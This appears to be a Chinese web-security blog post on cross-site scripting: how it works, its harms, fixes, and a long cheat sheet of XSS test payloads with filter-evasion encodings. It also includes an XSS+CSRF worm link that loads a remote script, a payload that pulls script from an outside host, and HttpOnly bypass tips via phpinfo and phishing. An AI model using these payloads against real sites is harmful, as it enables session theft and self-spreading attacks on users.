---
author: YOUZAI
title: 跨站脚本攻击
date: 2023/04/25
categories:
 - 常见漏洞
tags:
 - WEB安全
---

## 漏洞原理

攻击者在有漏洞的前端页面嵌入恶意代码，导致受害者访问页面时不知情的情况下触发恶意代码，获取受害者关键信息，形成 XSS 漏洞的原因本质上还是对输入输出的过滤限制不严格，导致精心构造的脚本输入后，在前端被当做有效代码并执行。

## 漏洞危害

恶意用户利用 XSS 代码攻击成功后，可能得到很高的权限(如执行一些操作)、私密网页内容、会话和 cookie 等各种内容。可以用于钓鱼攻击，挂马，cookie 获取，前端 js 挖矿等攻击行为，而且广泛适用于和其他漏洞结合，达到攻击服务器的目的。

## 修复建议

* 将重要的 cookie 标记为 httponly, 这样的话 Javascript 中的 document.cookie 语句就不能获取到 cookie 了。
* 表单数据规定值的类型，例如：年龄应为只能为 int、name 只能为字母数字组合。
* 对数据进行 Html Encode 处理。
* 过滤或移除特殊的 Html 标签， 例如:  &ltscript&gt, &ltiframe&gt , < for <, > for >, &quot for。
* 过滤 JavaScript 事件的标签。例如 "onclick", "onfocus" 等等。

## 常见的JS事件

|事件|描述|
|:-|:-|
|`onchange`|HTML元素改变|
|`onclick`|用户点击HTML元素|
|`onmouseover`|用户在一个HTML元素上移动鼠标|
|`onmouseout`|用户在一个HTML元素上移开鼠标|
|`onkeydown`|用户按下键盘按键|
|`onkeypress`|用户按下键盘按键|
|`onkeyup`|用户松开键盘按键|
|`onload`|浏览器已完成页面的加载|

详细可参考：[https://www.w3schools.com/jsref/dom_obj_event.asp](https://www.w3schools.com/jsref/dom_obj_event.asp)

## 常用对象的属性

|属性|描述|
|:-|:-|
|`document.cookie`|设置或返回与当前文档有关的所有 cookie|
|`document.write()`|向文档写 HTML 表达式或 JavaScript 代码|
|`document.URL`|返回当前文档的域名|
|`document.open()`|打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出|

## 同源策略

为了安全考虑，所有的浏览器都约定了==同源策略==，同源策略规定，两个不同域名之间不能使用js进行相互操作。比如：x.com 域名下的 javascript 不能操作 y.com 域下的对象。如果想要跨域的话，需要管理员进行特殊的配置。比如以下的配置：

```java
header ("Access-Control-Allow-Origin:x.com")
```

可跨域加载的标签：

|标签|内容|
|:-|:-|
|`<script src="...">`|js加载到本地执行|
|`<img src="...">`|图片|
|`<link href="...">`|CSS|
|`<iframe src="...">`|任意资源|

## HTML 特殊符号表示法

|特殊符号|代码|
|:-|:-|
|>|`>`|
|<|`<`|
|"|`"`|
|'（左单引号）|`&lsquo;`|
|'（右单引号）|`&rsquo;`|
|空格|` `|
|:|`&colon;`|
|换行|`&NewLine;`|

## 测试方法

```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><img src=x onerror=prompt(1)>
"><img src=x onerror=eval(alert(1))>
"><video src=x onerror="javascript:alert(1)">
"><audio src=x onerror="javascript:alert(1)">
"><input autofocus onfocus=alert(1)>
"><select autofocus onfocus=alert(1)>
"><textarea autofocus onfocus=alert(1)>
"><keygen autofocus onfocus=alert(1)> // 仅限火狐浏览器。
"><button formaction="javascript:alert(1)">
"><input type="text" onkeypress="alert(1)">
"><iframe onload=alert(1);></iframe>
"><iframe src=javascript:alert(1)></iframe>
"><iframe src="data:text/html,<script>alert(1)</script>"></iframe>
"><iframe src="data:text/html;base64,<script>alert(1)</script>">
"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
"><iframe src="javascript&colon;prompt&lpar;1&rpar;"></iframe>
"><svg onload=alert(1)>
"><svg/onload=alert(1)>
"><body onload="alert(1)">
"><details ontoggle="alert(1);">
"><details open ontoggle="alert(1);">
"><select onfocus=alert(1)></select>
"><select onfocus=alert(1) autofocus>
"><textarea onfocus=alert(1) autofocus>
"><marquee onstart=alert(1)></marquee> // IE 和火狐浏览器。
"><isindex type=image src=1 onerror=alert(1)> // 仅限IE。
"></title><img src=x onerror=alert(1)> // 利用浏览器解析的优先级，将 title 闭合。
"><bgsound src="javascript:alert(1);">
"><br size="&{alert(1)}">
"><LINK rel="stylesheet" href="javascript:alert(1);">
"><object><a href="javascript:;">Child tag A</a></object> // 当是a标签的时候可以使用 object 标签。
"><body onpageshow=alert(1)>
"><form action=javascript:alert(1)><input type=submit>
```

* 使用属性

```html
" onclick=alert(1)
" onmouseonver=alert(1)
" onscroll=alert(1)
constructor.constructor('alert("XSS")')() # 使用表达式。
eval('~a~le~rt~~(~~1~~)~'.replace(/~/g, ''))
eval(\'~a~le~rt~~(~~1~~)~\'.replace(/~/g, \'\'))
eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String())) # 使用 new String() 来创建新的空字符串。
```

* 上传一个 svg 的文件，并访问，以此达成 XSS 攻击

```html
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
   <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
   <script>alert(1)</script>
</svg>
```

* 绕过检测

```html
<Script>alert(1)</Script> // 使用大小写绕过。
<sscriptcript>alert(1)</sscriptcript> // 使用双写绕过。
// 利用拼接。
<script>top["al"+"ert"](1)</script>
<video/src/onerror=top[8680439..toString(30)](1);>
<video/src/onerror=top[11189117..toString(32)](1);>
<video/src/onerror=top.alert(1);>
<video/src/onerror=window.alert(1);>
<video/src/onerror=top[`al`%2B`ert`](1);>
<video/src/onerror=self[`al`%2B`ert`](1);>
<video/src/onerror=parent[`al`%2B`ert`](1);>
<video/src/onerror=window[`al`%2B`ert`](1);>
<video/src/onerror=frames[`al`%2B`ert`](1);>
<video/src/onerror=content[`al`%2B`ert`](1);>
<iframe onload=location='javascri'.concat('pt:aler','t(1)')>
<img src onerror=appendChild(createElement(`script`)).src=`https://x`.concat(`sspt.co`,`m/TuK26d`)>
<img src=x onerror="a=aler;b=t;c='(1);';eval(a+b+c)">
// 使用字符混淆。
<<script>alert("xss");//<</script> //使用字符混淆。
// 使用 Unicode 编码，在 JavaScript 中使用 \u。
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
// url 编码绕过。
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
// 使用 ASCII 码。
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
// Hex 绕过。
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
// 八进制绕过。
<img src=x onerror=alert('\170\163\163')>
// base64 绕过，atob 用于解密 base64。
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
// 使用反引号代替单引号、双引号。
<img src="x" onerror=alert(``xss``);>
// 使用 throw 代替括号。
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
// 使用开口标签。
<!---<script>alert(1)</script-->
// 利用 Tab。
<img src="java	script:alert(1)">
// 利用换行。
<img src="java&#x0A;script:alert(1)">
// 利用回车。
<img src="java&#x0D;script:alert(1)">
// 利用空字符。
<img src="java\0script:alert(1)">
// 利用非字母非数字。
<body onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>
// 使用 vbscript，asp 网站。
<img src=’vbscript:msgbox(1)’>
// 引用，使用 jjencode 或者 jsfuck。
<img src=x onerror="[][$='\143\157\156\163\164\162\165\143\164\157\162'][$]('\141\154\145\162\164(1)')()">
<img src=x onerror="[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()">
// 创建匿名函数。
<video/src/onerror=Function('alert(1)')();>
// 数组转字符。
<iframe onload=location=['java','script:','alert(1)'].join('')>
// 利用 object。
<object data=javascript:alert(1)>
```

## 结合利用

> XSS + CSRF实现蠕虫。

需要将 POST 请求的数据换成 GET 请求：

![](/images/4.png)

获取短链接，这个链接的功能是发表一个评论：

```html
http://xxx.edu.cn/meol/xxx?type=0&studyCircleId=&saytext=<script src=http://suo.im/xxx></script>
```

当他人访问到这个链接的时候，将会自动以登陆的账号发布该评论：

![](/images/5.png)

## HTTP only

**HttpOnly** 是包含在 Set-Cookie HTTP 响应标头中的附加标志。在生成 cookie 时使用 HttpOnly 标志有助于降低客户端脚本访问受保护 cookie 的风险，如果 HttpOnly 标志（可选）包含在 HTTP 响应标头中，则无法通过客户端脚本访问 cookie，如果浏览器支持这个标志。因此，即使存在跨站脚本（XSS）漏洞，并且用户意外访问了利用此漏洞的链接，浏览器也不会将 cookie 泄露给第三方。

### 绕过技术

在`phpinfo()`中可以看到存储的 session。

![](/images/6.png)

如果无法读取`Cookie`，可以使用伪造钓鱼页面的方式劫持用户输入，从而获取用户账号密码。